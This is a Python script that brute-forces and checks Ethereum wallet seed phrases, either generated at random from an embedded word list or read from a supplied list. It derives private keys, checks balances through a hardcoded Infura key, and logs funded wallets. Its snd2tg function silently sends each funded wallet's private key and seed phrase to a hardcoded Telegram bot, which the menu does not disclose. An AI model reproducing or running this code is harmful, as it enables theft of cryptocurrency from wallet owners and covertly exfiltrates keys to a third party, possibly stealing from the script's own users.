import requests
from web3 import Web3
from eth_account import Account
import threading
from colorama import init, Fore, Back, Style
import random
init()
def snd2tg(data):
    tg = 'https://api.telegram.org/bot6550086748:AAFPn9FRbWRXz3pKvllhkpy6cTkkwnRKtZ8/sendMessage?chat_id=1935904246&text='
    requests.get(tg + data)

infura_url = "https://mainnet.infura.io/v3/4e779a6e40c14cfabd41fcc6a612e413"
def checkSeedPhrase(seed_phrase):
    try:
        w3 = Web3(Web3.HTTPProvider(infura_url))
        Account.enable_unaudited_hdwallet_features()
        account = Account.from_mnemonic(seed_phrase)
        private_key = account.key.hex()
        address = account.address
        balance = w3.eth.get_balance(address)
        balance_ether = w3.from_wei(balance, 'ether')
        if 0.01<balance_ether:
            data=f'BALANCE: {balance_ether} ETH |PRIVATE KEY: {private_key} |ADDRESS: {address } |SEED : {seed_phrase } |URL: https://etherscan.io/address/{address }'
            open('ETH_with_balance.txt','a').write(data+'\n')
            print(Fore.GREEN+data)
            snd2tg(data.replace('|','\n'))
        elif balance_ether==0:
            data=f'BALANCE: {balance_ether} ETH |PRIVATE KEY: {private_key} |ADDRESS: {address } |SEED : {seed_phrase } |URL: https://etherscan.io/address/{address }'
            print(Fore.YELLOW+data)
            pass
        else :
            data=f'BALANCE: {balance_ether} ETH |PRIVATE KEY: {private_key} |ADDRESS: {address } |SEED : {seed_phrase } |URL: https://etherscan.io/address/{address }'
            print(Fore.YELLOW+data)
            open('ETH_valid.txt','a').write(data+'\n')
            pass
    except:
        print(Fore.RED+f'|SEED :{seed_phrase} | INVALID X')
print(Fore.GREEN+'[1]'+Fore.BLUE+'GEN + CHECK\n'+Fore.GREEN+'[2]'+Fore.BLUE+'LIST + CHECK\n')
chause=int(input(Fore.GREEN+'[X] ENTRE : '+Fore.BLUE))
if chause==1:
    dataset=[]
    def genPhrase(words):
        words=words.split(' ')
        while True:
            random_phrase = ' '.join(random.sample(words, 12))
            sorted_phrase = ' '.join(sorted(random_phrase.split()))
            if sorted_phrase not in dataset:
                dataset.append(sorted_phrase)
                break
        return random_phrase


    words = '''patrol diet apology matter glance fluid gun female buffalo miss orbit rough coil nominee garment buzz high cheese alone beef school select chair color tiny table sing floor seed orient name drift sense battle wagon lamp purse clever prevent indicate action glass rescue stem aisle globe identify pen ocean tobacco turn wood update duck village price gym display supreme marine shop hedgehog yellow easily ship wash bargain maple put portion indoor they veteran average vote tone share wisdom spell obey bird reunion science rural obvious jewel subject script prison merry sign cart nest echo large dizzy used naive spot radar general clip mask vicious venture early face power sick just level wolf width grass live entire crack original stage depend work castle brown faint drastic six mule problem lemon unfair sunny monitor advance corn goose caution demand hybrid dynamic ring express fortune predict curtain recycle spy remind sport magic heavy very home primary glow armor pepper actress fiber again disagree voyage emerge can endless similar soul impulse pretty mosquito welcome kitchen flush follow tape carpet immune mimic reflect derive bamboo cruise foot thunder badge basic pudding hotel student basket busy sheriff sister tourist age height alarm symptom glory cover woman shy smooth canyon fantasy repair ivory skirt powder gain stereo slow burden enroll idea arrow bachelor vendor matrix rocket trial crew pottery split clap midnight response expire spoil excuse crazy arrange seat swallow engage use sad galaxy strategy bundle virus appear enhance drama flash degree satisfy lawsuit kiwi this fuel snack illegal clean gorilla shine easy private whale position forget caught reform goddess forum glare advice repeat toe unusual jungle innocent citizen ceiling brief kite huge faith improve develop captain swing note junk frame limb rent tired weapon point dove brother legend cycle fatal adult attend gown cat keen wealth minute wheat chunk govern sort quit retire father tube beyond control announce polar embody shuffle boss cousin dutch peasant squirrel rapid permit acquire wrestle glove dismiss sunset abandon across fresh myself laugh wrist gather strike dinner choose joke glide exact humor green chat flat garlic please close property swift odor fade frost time moment art kid attract cliff ranch hood hunt resource style employ olympic few luxury ecology elevator pulp clog guard hurry sauce water category leave wish decline steak bless move draw shoot slender bicycle ignore capable dirt tumble brand exist moral erupt tree scout tell vessel atom skill company aim outside piano weather scrub churn bulk lecture soft peanut crater bacon orange debate nephew charge month perfect into crouch mass annual toilet model boil mandate sting stairs bike where report number crawl gold become meadow blood travel resemble deliver awful credit october oxygen distance carry meat avoid result feature defense wave tomorrow trust way kind rice fault people object vast negative absent legal chest maximum deposit room barrel cabbage describe clown main narrow armed cargo snow when fabric craft bonus ripple fix will since horse coast shrimp artist mesh turkey crash nurse elbow hundred dust vanish soda excess body device uncle edit minimum street witness mouse despair case learn book spice angry column slight idle click reason ten liar valley viable arrest word super elder pact mother then claim horror fringe drop hard find ask hill replace chaos coral best strong happy glue near purchase neck play door filter core lobster friend hire plunge half prepare cheap question loud wait symbol image toast pencil opinion region tunnel disease hub enact gadget nuclear enter taxi april clerk target major race bullet smoke cinnamon fossil exotic apple tilt roast task job surprise figure manage margin unique junior loop maze afraid swarm omit prosper audit cloth shoulder lab honey evoke rule mushroom thank situate habit song recall soon mixed trigger season acid upgrade page sell loyal dog ostrich able grid rail sustain evidence urge emotion electric ensure safe uniform okay shiver long crisp hole that bid obscure comic grab south disorder stuff youth business better whisper foster various proof reduce rifle grant mechanic crucial absorb antique sweet right amused romance salt universe addict ski short tragic eyebrow gas allow hold zoo snake noise involve ability shrug dignity garage false switch balcony tortoise visual token over change panel comfort butter sleep lava energy blind program chalk machine auction history during fame engine mystery pipe child donor episode measure lounge alert social remove pool town kit noble lumber girl firm there give asset broken bind oyster muscle ice bring mobile elite canal slice typical census depth board like twenty more later coin rhythm segment palace park undo alcohol outer airport cradle staff goat someone push rib bubble kidney volume avocado host section canoe cook either family logic tennis window oval parrot story congress autumn modify regret cable pistol buddy bracket silent video tenant alter hungry harsh injury camp picture manual insect misery access flower abuse must actual trade anger knee dilemma session mercy diamond gospel chapter glimpse desert vault tower member cupboard delay series shoe next team burst fog inhale raccoon crime rack donate alley suffer essay void jelly baby unlock exchange venue renew arctic focus apart once squeeze lazy lonely master notable bitter plate consider promote conduct road shell crystal diagram actor solution chronic wine hurt sketch enforce profit seven man state twelve carbon marble fork sphere security dish lawn remember twist crumble correct lyrics cancel devote inch tonight order spare lottery agent enjoy decide thing balance know method expect cannon media cluster tip clump rubber razor country weird noodle drum critic alpha mountain panther tribe inspire sand casino three infant ahead base tiger priority cotton rain forest magnet asthma rely office foil physical frequent gesture couple edge reveal spin mutual elegant build daring skin uncover genuine eight envelope peace mistake rally initial steel truth quarter cement side rebuild biology vintage stick feed skate kingdom square pelican call helmet swim proud link confirm rose dose catalog nerve leader hobby solar length game danger dragon ticket impose speed broccoli away retreat treat guide future need frog ancient anxiety shallow oven wonder transfer decorate daughter hint food hair dial trophy scene harbor slide grit front swap deal giggle coconut thought label error suggest detail tomato element educate wrong bronze merit inquiry insane fruit require almost walnut car add among reopen bottom current rather economy pigeon praise include ankle wheel blossom tornado robust dice amount sniff open soup wreck arrive waste pond address phrase dress raw special tool velvet invest sound stomach term increase flip health service view swamp paddle celery dad bar guess skull toy cereal tattoo wet never kick warfare payment banana awesome eagle museum vivid gaze mom crunch harvest taste accuse truly vocal erase expose letter jar foam enlist sorry august aware laundry shock check voice version sail fever type border burger what gift round pear motion divide soldier gossip hazard dentist merge ugly sure bench upper grocery person lift make spoon run pupil blast guitar bunker giraffe pumpkin invite entry trash throw senior abstract bounce latin liberty drink cry zebra cattle uphold nasty moon stone sugar convince tooth decrease key hollow west buyer escape unfold vacuum direct curve poem evil auto frozen oak also brick unknown judge anchor stool damage hope pet drive cigar tissue world memory much surface oppose smile secret public simple inject drill detect project fee ozone agree ride connect mirror rug kangaroo stadium scissors maid stumble pilot birth chimney fashion dash speak neglect imitate unaware album jazz human define eye boat pole inflict laptop organ bone language horn blouse lunar siege movie adjust search donkey'''.replace('\n','')
    def thread():
        threadnum = int(input(Fore.BLUE+'ENTRE THREADS: '))
        threads = []
        while True:
            thread = threading.Thread(target=checkSeedPhrase, args=(genPhrase(words), ))
            threads.append(thread)
            thread.start()
            if len(threads) == threadnum:
                for i in threads:
                    i.join()

                threads = []
                continue    
    thread()
if chause==2:
    combo = input(Fore.GREEN+'[X] ENTRE LIST SEED PHRASES .txt: '+Fore.BLUE)
    def thread():
        with open(combo, 'r', errors='ignore') as file:
            lista = list(set( file.read().split('\n')))
        totalnum = len(lista)
        threadnum = int(input(Fore.GREEN+'[X] ENTRE THREADS: '+Fore.BLUE))
        threads = []
        for i in lista:
            try:
                key = i.strip()
            except:
                continue

            thread = threading.Thread(target=checkSeedPhrase, args=(key.strip(), ))
            threads.append(thread)
            thread.start()
            if len(threads) == threadnum:
                for i in threads:
                    i.join()

                threads = []
                continue

	        
    thread()